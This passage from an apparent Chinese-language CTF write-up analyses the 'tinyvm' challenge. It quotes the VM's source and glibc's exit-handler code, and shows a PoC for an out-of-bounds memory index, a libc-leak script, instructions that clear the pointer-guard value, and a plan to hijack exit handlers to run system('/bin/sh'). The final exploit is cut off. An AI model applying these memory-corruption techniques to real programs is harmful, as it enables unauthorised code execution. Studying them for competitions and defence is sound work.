class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//////////////////////////////////////////////////</span><br><span class="line">// 1. REGISTERS //////////////////////////////////</span><br><span class="line">//////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">TVM has 17 registers, modeled after x86 registers.</span><br><span class="line">Register names are written lower-case.</span><br><span class="line"></span><br><span class="line">(EAX - EDX, General Purpose)</span><br><span class="line">EAX</span><br><span class="line">EBX</span><br><span class="line">ECX</span><br><span class="line">EDX</span><br><span class="line"></span><br><span class="line">ESI</span><br><span class="line">EDI</span><br><span class="line"></span><br><span class="line">ESP - Stack pointer, points to the top of the stack</span><br><span class="line">EBP - Base pointer, points to the base of the stack</span><br><span class="line"></span><br><span class="line">EIP - Instruction pointer, this is modified with the jump commands, never directly</span><br><span class="line"></span><br><span class="line">R08 - R15, General Purpose</span><br><span class="line"></span><br><span class="line">const char *tvm_register_map[] = &#123;</span><br><span class="line">&quot;eax&quot;, &quot;ebx&quot;, &quot;ecx&quot;, &quot;edx&quot;,</span><br><span class="line">&quot;esi&quot;, &quot;edi&quot;, &quot;esp&quot;, &quot;ebp&quot;,</span><br><span class="line">&quot;eip&quot;,</span><br><span class="line">&quot;r08&quot;, &quot;r09&quot;, &quot;r10&quot;, &quot;r11&quot;,</span><br><span class="line">&quot;r12&quot;, &quot;r13&quot;, &quot;r14&quot;, &quot;r15&quot;, 0&#125;;</span><br></pre></td></tr></table></figure><h3 id="对于输入的解释"><a href="#对于输入的解释" class="headerlink" title="对于输入的解释"></a>对于输入的解释</h3><p>对于输入文件的interpret在<code>tvm_vm_interpret</code>中。通过直接读取文件，将文件内容存入本地并传递给<code>tvm_preprocess</code>的方法。</p><p>在预处理阶段，程序会解析<code>include</code>部分(去寻找一个新的.vm文件，并把内容直接copy过来)以及<code>define</code>部分)(根据define关键字找到key和value，并通过<code>tvm_htab_add_ref</code>添加到一个程序的一个类似ELF的data表中去)</p><p>在<code>parse_label</code>阶段，主要是针对程序不同段之间的汇编标志(label)进行划分。并通过<code>tvm_htab_add</code>设置一个新的label。中间还会检查避免产生了重复的label。</p><p>在<code>parse_program</code>阶段，依然是通过每一行遍历，找到command和argument。主要在<code>tvm_parse_program</code>中。在这里有一个转化内存的地方。可以看到应该是直接将arg设置为我们给定的数字所对应的程序一开始申请的<code>mem_space</code>数组的下标。<strong>这里可能造成内存的越界访问</strong>。但是注意，下面的<code>tvm_parse_value</code>最终会调用<code>strtoul</code>，也就是最终的数字还是无符号数。回顾一下之前这段memory所在的地址空间，我们应该是不能直接修改GOT表的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tvm_parse_args()</span></span><br><span class="line"><span class="comment">/* Check to see whether the token specifies an address */</span></span><br><span class="line"><span class="keyword">if</span> (instr_tokens[*instr_place+<span class="number">1</span> + i][<span class="number">0</span>] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line"><span class="type">char</span> *end_symbol = <span class="built_in">strchr</span>(</span><br><span class="line">instr_tokens[*instr_place+<span class="number">1</span> + i], <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (end_symbol) &#123;</span><br><span class="line">*end_symbol = <span class="number">0</span>;</span><br><span class="line">args[i] = &amp;((<span class="type">int</span> *)vm-&gt;mem-&gt;mem_space)[</span><br><span class="line">tvm_parse_value(instr_tokens[</span><br><span class="line">*instr_place+<span class="number">1</span> + i] + <span class="number">1</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此以外，<code>parse_program</code>还会找到语句中的label以及判断是否是寄存器，以及是否为立即数。</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>运行vm在<code>tvm_vm_run</code>中。基本就是对vm里面每个指令做解释。这个和pa里面的非常类似了。甚至pa里面的还要更复杂一些，还牵涉到对于不同指令集的翻译。这里就是简单的对汇编进行匹配即可。其实这张表对于理解x86汇编也很有用，复制一份。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tvm_step</span><span class="params">(<span class="keyword">struct</span> tvm_ctx *vm, <span class="type">int</span> *instr_idx)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> **args = vm-&gt;prog-&gt;args[*instr_idx];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (vm-&gt;prog-&gt;instr[*instr_idx]) &#123;</span><br><span class="line"><span class="comment">/* nop   */</span><span class="keyword">case</span> <span class="number">0x0</span>:  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* int   */</span><span class="keyword">case</span> <span class="number">0x1</span>:  <span class="comment">/* unimplemented */</span> <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* mov   */</span><span class="keyword">case</span> <span class="number">0x2</span>:  *args[<span class="number">0</span>] = *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* push  */</span><span class="keyword">case</span> <span class="number">0x3</span>:  tvm_stack_push(vm-&gt;mem, args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* pop   */</span><span class="keyword">case</span> <span class="number">0x4</span>:  tvm_stack_pop(vm-&gt;mem, args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* pushf */</span><span class="keyword">case</span> <span class="number">0x5</span>:  tvm_stack_push(vm-&gt;mem, &amp;vm-&gt;mem-&gt;FLAGS); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* popf  */</span><span class="keyword">case</span> <span class="number">0x6</span>:  tvm_stack_pop(vm-&gt;mem, args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* inc   */</span><span class="keyword">case</span> <span class="number">0x7</span>:  ++(*args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* dec   */</span><span class="keyword">case</span> <span class="number">0x8</span>:  --(*args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* add   */</span><span class="keyword">case</span> <span class="number">0x9</span>:  *args[<span class="number">0</span>] += *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* sub   */</span><span class="keyword">case</span> <span class="number">0xA</span>:  *args[<span class="number">0</span>] -= *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* mul   */</span><span class="keyword">case</span> <span class="number">0xB</span>:  *args[<span class="number">0</span>] *= *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* div   */</span><span class="keyword">case</span> <span class="number">0xC</span>:  *args[<span class="number">0</span>] /= *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* mod   */</span><span class="keyword">case</span> <span class="number">0xD</span>:  vm-&gt;mem-&gt;remainder = *args[<span class="number">0</span>] % *args[<span class="number">1</span>]; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* rem   */</span><span class="keyword">case</span> <span class="number">0xE</span>:  *args[<span class="number">0</span>] = vm-&gt;mem-&gt;remainder; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* not   */</span><span class="keyword">case</span> <span class="number">0xF</span>:  *args[<span class="number">0</span>] = ~(*args[<span class="number">0</span>]); <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* xor   */</span><span class="keyword">case</span> <span class="number">0x10</span>:  *args[<span class="number">0</span>] ^= *args[<span class="number">1</span>];  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* or    */</span><span class="keyword">case</span> <span class="number">0x11</span>: *args[<span class="number">0</span>] |= *args[<span class="number">1</span>];   <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* and   */</span><span class="keyword">case</span> <span class="number">0x12</span>: *args[<span class="number">0</span>] &amp;= *args[<span class="number">1</span>];   <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* shl   */</span><span class="keyword">case</span> <span class="number">0x13</span>: *args[<span class="number">0</span>] &lt;&lt;= *args[<span class="number">1</span>];  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* shr   */</span><span class="keyword">case</span> <span class="number">0x14</span>: *args[<span class="number">0</span>] &gt;&gt;= *args[<span class="number">1</span>];  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* cmp   */</span><span class="keyword">case</span> <span class="number">0x15</span>: vm-&gt;mem-&gt;FLAGS =</span><br><span class="line">((*args[<span class="number">0</span>] == *args[<span class="number">1</span>]) | (*args[<span class="number">0</span>] &gt; *args[<span class="number">1</span>]) &lt;&lt; <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* call */</span><span class="keyword">case</span> <span class="number">0x17</span>: tvm_stack_push(vm-&gt;mem, instr_idx);</span><br><span class="line"><span class="comment">/* jmp */</span><span class="keyword">case</span> <span class="number">0x16</span>: *instr_idx = *args[<span class="number">0</span>] - <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* ret   */</span><span class="keyword">case</span> <span class="number">0x18</span>: tvm_stack_pop(vm-&gt;mem, instr_idx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* je    */</span><span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">*instr_idx = (vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x1</span>)</span><br><span class="line">? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jne   */</span><span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">*instr_idx = (!(vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x1</span>))</span><br><span class="line">? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jg    */</span><span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">*instr_idx = (vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x2</span>)</span><br><span class="line">? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jge   */</span><span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">*instr_idx = (vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x3</span>)</span><br><span class="line">? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jl    */</span><span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">*instr_idx = (!(vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x3</span>))</span><br><span class="line">? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* jle   */</span><span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">*instr_idx = (!(vm-&gt;mem-&gt;FLAGS &amp; <span class="number">0x2</span>))</span><br><span class="line">? *args[<span class="number">0</span>] - <span class="number">1</span> : *instr_idx;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">/* prn   */</span><span class="keyword">case</span> <span class="number">0x1F</span>: <span class="built_in">printf</span>(<span class="string">&quot;%i\n&quot;</span>, *args[<span class="number">0</span>]);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里再次确认了使用指令访问内存时，没有任何的限制。同时这里还有一个挺有意思的指令<code>prn</code>可以用作输出内容。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>我们尝试验证一下上面的内容，发现确实成功了。编写以下的poc.vm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">mov eax, [-1]</span><br><span class="line">end:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>strtoul处理结果为无符号的-1。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119185322145.png" alt="image-20230119185322145"></p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119185333825.png" alt="image-20230119185333825"></p><p>看一下我们对内存的修改过程。在<code>tvm_parse_value</code>之后。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119185736628.png" alt="image-20230119185736628"></p><p>修改前，变量在rdx中。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119185836740.png" alt="image-20230119185836740"></p><p>修改后。发现地址减小。结合汇编中的prt和mov，说明我们已经达到任意地址读写的目的了。只不过需要注意输入的内容需要乘上4才是和分配的<code>memory</code>之间的偏移。并且<code>memory</code>开始的位置是在一开始分配空间加上0x10地址的地方。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119185901319.png" alt="image-20230119185901319"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>原来这道题怎么探索libc版本才是难点。看了网上别人的wp，是通过逐步dump出所有libc字段的byte，然后直接string出结果的。dump的方法就是移动指针到和当前memory偏移固定的位置(这个位置也在7f开头的data部分，可能是一样的偏移？)然后全部打印并接受。得到远程的libc是<code>Ubuntu GLIBC 2.35-0ubuntu3.1</code>，没有hook函数，可能需要找exit_hook或者FSOP。</p><h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><p>这道题给了我们一种新的调试方法。如果一个文件只接收命令行参数，那就没法用pwntools在动态调试的时候下断点。这里参考了<a href="https://ctftime.org/writeup/36064">网上的wp</a>种的脚本，直接使用的是gdb.debug()启动的binary。</p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>首先找到和PLT表的偏移。这里学到两个新的命令，vmmap libc和tele。似乎后者可以简单解引用。经过测试，两者之间距离是不变的。因此可以用这里的PLT泄露libc。这里选择calloc的plt。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119195404058.png" alt="image-20230119195404058"></p><p>对应的.vm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file = &quot;&quot;&quot;</span><br><span class="line">start:</span><br><span class="line">mov eax, [17331215]</span><br><span class="line">    prn eax</span><br><span class="line">    mov eax, [17331216]</span><br><span class="line">    prn eax</span><br><span class="line">end:</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p>这种接收方式并不是很稳定。主要原因是mmap出来的堆地址会变化</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119204820469.png" alt="image-20230119204820469"></p><h3 id="写hook"><a href="#写hook" class="headerlink" title="写hook"></a>写hook</h3><p>首先需要注意到：程序中的地址都是int大小的，因此在64位下并不能直接写入任意地址。我们可以利用以下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">tvm_stack_push</span><span class="params">(<span class="keyword">struct</span> tvm_mem *mem, <span class="type">int</span> *item)</span></span><br><span class="line">&#123;</span><br><span class="line">mem-&gt;registers[<span class="number">0x6</span>].i32_ptr -= <span class="number">1</span>;</span><br><span class="line">*mem-&gt;registers[<span class="number">0x6</span>].i32_ptr = *item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来进行任意地址写。不过就是可能破坏esp指针。每次push的时候将会在esp所在指针-4的地方写入item内容。</p><p>对于2.35，能用的hook函数应该只剩下exit_hook和FSOP里面的一些gadget了。这里依然学习的是<a href="https://ctftime.org/writeup/36064">上面提到的wp</a>,里面提到了一种很有意思的针对<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.c">exit_hook</a>的利用方法。这种方法需要我们能够<strong>至少三次任意地址写</strong>，<strong>一次写fs[30]，另一次写exithook，其中包含两个变量，一个是system，一个是binsh的地址</strong>。如果不能三次任意地址写，需要有一次读，两次写。其中读把fs[30]读出来。因为在2.35中，对exithook做了一些mangle处理，防止被直接写函数。(注意下面的<code>PTR_DEMANGLE</code>和<code>PTR_MANGLE</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call all functions registered with `atexit&#x27; and `on_exit&#x27;,</span></span><br><span class="line"><span class="comment">   in the reverse of the order in which they were registered</span></span><br><span class="line"><span class="comment">   perform stdio cleanup, and terminate program execution with STATUS.  */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp,</span><br><span class="line">     <span class="type">bool</span> run_list_atexit, <span class="type">bool</span> run_dtors)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* First, call the TLS destructors.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (run_dtors)</span><br><span class="line">      __call_tls_dtors ();</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We do it this way to handle recursive calls to exit () made by</span></span><br><span class="line"><span class="comment">     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call</span></span><br><span class="line"><span class="comment">     everyone on the list and use the status value in the last</span></span><br><span class="line"><span class="comment">     exit (). */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cur == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Exit processing complete.  We will not allow any more</span></span><br><span class="line"><span class="comment">     atexit/on_exit registrations.  */</span></span><br><span class="line">  __exit_funcs_done = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> new_exitfn_called = __new_exitfn_called;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">      <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">      <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">      <span class="type">void</span> *arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> ef_free:</span><br><span class="line">    <span class="keyword">case</span> ef_us:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_on:</span><br><span class="line">      onfct = f-&gt;func.on.fn;</span><br><span class="line">      arg = f-&gt;func.on.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      onfct (status, arg);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_at:</span><br><span class="line">      atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      atfct ();</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> ef_cxa:</span><br><span class="line">      <span class="comment">/* To avoid dlclose/exit race calling cxafct twice (BZ 22180),</span></span><br><span class="line"><span class="comment"> we must mark this function as ef_free.  */</span></span><br><span class="line">      f-&gt;flavor = ef_free;</span><br><span class="line">      cxafct = f-&gt;func.cxa.fn;</span><br><span class="line">      arg = f-&gt;func.cxa.arg;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="comment">/* Unlock the list while we call a foreign function.  */</span></span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      cxafct (arg, status);</span><br><span class="line">      __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))</span><br><span class="line">    <span class="comment">/* The last exit function, or another thread, has registered</span></span><br><span class="line"><span class="comment">       more exit functions.  Start the loop over.  */</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      *listp = cur-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line"><span class="comment">/* Don&#x27;t free the last element in the chain, this is the statically</span></span><br><span class="line"><span class="comment">   allocate element.  */</span></span><br><span class="line"><span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK (__libc_atexit, ());</span><br><span class="line"></span><br><span class="line">  _exit (status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中<code>mangle</code>所做的等价于下面的伪代码。所以我们要么把<code>fs:0x30</code>改成0，要么读出来，才能用exit_hook。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PTR_MANGLE</span></span><br><span class="line">xor    reg,QWORD PTR fs:<span class="number">0x30</span></span><br><span class="line">rol    reg,<span class="number">0x11</span></span><br><span class="line">call   reg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PTR_DEMANGLE</span></span><br><span class="line">ror    reg,<span class="number">0x11</span></span><br><span class="line">xor    reg,QWORD PTR fs:<span class="number">0x30</span></span><br><span class="line">call   reg</span><br></pre></td></tr></table></figure><p>假如说要看[fs:30]，用到的命令如下</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119212239825.png" alt="image-20230119212239825"></p><p>清除canary相关代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add esp, 65028080</span><br><span class="line">sub esp, 10376</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br></pre></td></tr></table></figure><p>接下来写hook，需要写两个，一个是system地址，另一个是binsh地址。其中还需要做一个rotate工作。这两部分地址需要放在下面<code>fn</code>和<code>arg</code>的地方。其中fn需要做rotate。事实上，这两者的地址也是相连的。因此我们可以直接用四次push来写入数字。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230120125954340.png" alt="image-20230120125954340"></p><p>综上可知：我们要做的事情是</p><ol><li>写[fs:30]为0</li><li>计算system地址，并左移0x11位</li><li>计算”/bin/sh”地址</li><li>在<code>initial</code>中fn和arg的地方写入system的Binsh</li><li>getshell</li></ol><h3 id="exp-vm"><a href="#exp-vm" class="headerlink" 